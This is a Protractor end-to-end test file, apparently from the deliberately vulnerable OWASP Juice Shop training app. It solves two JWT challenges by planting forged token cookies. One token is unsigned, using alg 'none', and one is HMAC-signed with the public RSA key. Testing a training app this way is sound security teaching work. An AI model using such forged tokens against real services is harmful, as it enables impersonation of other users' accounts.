describe('/', () => {
  describe('challenge "jwtTier1"', () => {
    it('should accept an unsigned token with email jwtn3d@juice-sh.op in the payload ', () => {
      browser.manage().addCookie({ name: 'token', value: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQGp1aWNlLXNoLm9wIn0sImlhdCI6MTUwODYzOTYxMiwiZXhwIjo5OTk5OTk5OTk5fQ.' })
      browser.get('/#/')
    })

    protractor.expect.challengeSolved({challenge: 'JWT Issues Tier 1'})
  })

  describe('challenge "jwtTier2"', () => {
    it('should accept a token HMAC-signed with public RSA key with email rsa_lord@juice-sh.op in the payload ', () => {
      browser.manage().addCookie({ name: 'token', value: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoicnNhX2xvcmRAanVpY2Utc2gub3AifSwiaWF0IjoxNTA4NjM5NjEyLCJleHAiOjk5OTk5OTk5OTl9.dFeqI0EGsOecwi5Eo06dFUBtW5ziRljFgMWOCYeA8yw' })
      browser.get('/#/')
    })

    protractor.expect.challengeSolved({challenge: 'JWT Issues Tier 2'})
  })
})
